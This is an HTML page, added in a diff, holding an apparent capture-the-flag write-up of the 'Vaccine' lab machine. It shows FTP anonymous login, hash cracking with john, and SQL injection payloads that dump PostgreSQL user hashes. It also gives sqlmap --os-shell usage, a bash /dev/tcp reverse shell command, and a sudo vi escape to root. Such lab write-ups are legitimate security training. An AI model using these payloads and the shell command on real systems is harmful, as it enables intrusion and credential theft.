@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
+    <style>
+        img {
+            max-width: 80%;
+        }
+    </style>
+    <title>Vaccine</title>
+</head>
+<body>
+    <div class="container">
+        <h1>Vaccine</h1>
+        <hr>
+        
+        <h3>Port Scan</h3>
+        <p>
+            <img src="./imgs/portscan.png" alt="nmap">
+        </p>
+
+        <h3>FTP</h3>
+        <p>
+            I saw open FTP port. I tried <code>anonymous</code> and got in.
+            I got the <code>backup.zip</code><br>
+            <img src="./imgs/ftp.png" alt="">
+        </p>
+
+        <h3>Password Cracking</h3>
+        <p>
+            I tried to unzip it but I needed a password. I used <code>zip2john</code> to crack the password.<br>
+            <code>zip2john backup.zip > hash.txt</code><br>
+            <img src="./imgs/zippassword.png" alt="zip password"><br>
+            Then I unzipped it with the password.
+        </p>
+        <p>
+            Then I read <code>index.php</code><br>
+            <img src="./imgs/adminpassword.png" alt="admin hash"><br>
+            Here I found a hash for the admin user. Now I will try to crack it as well. Also, it is helpful to know that it is <code>md5 hash</code><br>
+            I put the hash into <code>md5_hash.txt</code><br>
+            <code>john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt md5_hash.txt</code><br>
+            <img src="./imgs/admincrack.png" alt="admin password cracked">
+        </p>
+
+        <h3>The Website</h3>
+        <p>
+            <img src="./imgs/megacorp.png" alt="megacorp"><br>
+            I used the found creds to get inside:<br>
+            <code>admin:qwerty789</code><br>
+            <img src="./imgs/inside.png" alt="inside">
+        </p>
+        <p>
+            I tried to search for something and noticed this:<br>
+            <img src="./imgs/searchurl.png" alt="search url">
+        </p>
+        <p>
+            We can see that we have at list 4 columns that we can see which are: name, type, fuel, engine. Number of columns is important for us, so that we can do SQL Injections.
+            Also, we can assume that there is one more column <code>id</code> because it is usually there.
+        </p>
+        <p>
+            A good way to find out what kind of database we are dealing with is to get it's version. After spending a few minutes trying to figure out the right payload I got this:<br>
+            <img src="./imgs/postgres.png" alt="postgresql"><br>
+            <code>1' UNION SELECT NULL, version(), NULL, NULL, NULL-- -</code>
+        </p>
+        <p>
+            I am going to get some more information about the table and database that we are working with.<br>
+            <code>1' UNION SELECT NULL, column_name, data_type, NULL, NULL FROM information_schema.columns WHERE table_name = 'cars';-- -</code><br>
+            <img src="./imgs/columns.png" alt="columns">
+        </p>
+
+        <p>
+            <code>1' UNION SELECT NULL, table_name, table_type, NULL, NULL FROM information_schema.tables;-- -</code>
+            <img src="./imgs/tables.png" alt="tables">
+        </p>
+
+        <p>
+            <code>1' UNION SELECT NULL, column_name, data_type, NULL, NULL FROM information_schema.columns WHERE table_name='pg_user';-- -</code>
+            <img src="./imgs/pg_user.png" alt="pg_user">
+        </p>
+
+        <p>
+            <code>1' UNION SELECT NULL, username, passwd, NULL, NULL FROM pg_user;-- -</code>
+            <img src="./imgs/pg_user.png" alt="pg_user">
+        </p>
+
+        <h3>sqlmap</h3>
+        <p>
+            I could continue doing this and maybe eventually I would get somewhere, but I decided to use a tool called <code>sqlmap</code><br>
+            <code>sqlmap -u "http://vaccine.htb/dashboard.php" --data="search=1" --cookie="PHPSESSID=fft7sn59udmovaau1lqc7mrlbd"</code><br>
+            So now we know it is vulnerable.
+        </p>
+        <p>
+            <code>sqlmap -u "http://vaccine.htb/dashboard.php" --data="search=1" --cookie="PHPSESSID=fft7sn59udmovaau1lqc7mrlbd" --os-shell --batch</code>
+            I used <code>--os-shell</code> to get a shell and <code>--batch</code> so it doesn't ask me all the questions.
+        </p>
+        <p>
+            Since this shell was so ugly, I decided to get a better reverse shell. So I started nc listener and put this command in:<br>
+            <code>bash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"</code>
+        </p>
+        <p>
+            Also, I found postgres' <code>id_rsa</code>, I got it on machine, and ssh'ed inside. I tried to execute <code>sudo -l</code> but it did not give me much. So I decided to do some research.<br>
+            It is always a good idea to look at the website's source code.<br>
+            <img src="./imgs/html.png" alt="html directory"><br>
+            Here is what I found when I was reading <code>dashboard.php</code><br>
+            <img src="./imgs/password.png" alt="dashboard.php">
+        </p>
+        <p>
+            Now with the password I execute <code>sudo -l</code><br>
+            <img src="./imgs/sudol.png" alt="sudo -l">
+        </p>
+        <p>
+            Here I find out that I can run <code>/bin/vi /etc/postgresql/11/main/pg_hba.conf</code> with sudo as root. And that's what I do.<br>
+            <img src="./imgs/bash" alt="bash"><br>
+            With knowing <code>vi/vim</code> well enough or at least knowing how to google would tell you that you can get a shell straight from <code>vi</code> using <code>:!bash</code><br>
+            <img src="./imgs/bash.png" alt=""><br>
+            Hit <code>Enter</code> and get your root shell.<br>
+            <img src="./imgs/root.png" alt="root">
+        </p>   
+    </div>
+</body>
+</html>
